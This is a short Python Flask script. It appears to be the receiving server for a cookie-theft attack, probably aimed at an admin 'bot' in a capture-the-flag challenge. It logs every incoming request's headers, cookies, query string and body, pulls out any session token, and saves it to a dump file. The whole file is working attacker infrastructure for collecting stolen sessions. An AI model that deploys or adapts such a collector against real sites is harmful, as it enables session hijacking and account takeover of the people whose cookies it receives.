from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/')
def capture():
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log = f"\n--- BOT CONNECTED [{now}] ---\n"

    # Full headers
    log += "[+] Headers:\n"
    for k, v in request.headers.items():
        log += f"    {k}: {v}\n"

    # Cookies
    cookie = request.headers.get('Cookie', '')
    log += f"\n[+] Raw Cookie: {cookie}\n"

    # Try extract session
    token = ''
    for part in cookie.split(';'):
        if 'session=' in part:
            token = part.strip().split('session=')[1]
            break

    log += f"\n[+] Extracted session token:\n    {token if token else '[!] Not found'}\n"

    # Full GET params
    log += f"\n[+] Query Params:\n    {request.query_string.decode()}\n"

    # Body (in case of POST)
    if request.method == 'POST':
        log += f"\n[+] POST Data:\n    {request.data.decode()}\n"

    # Print to terminal
    print(log)

    # Save to file
    with open('bot_dump.log', 'a') as f:
        f.write(log)

    return 'OK'

app.run(port=8081)
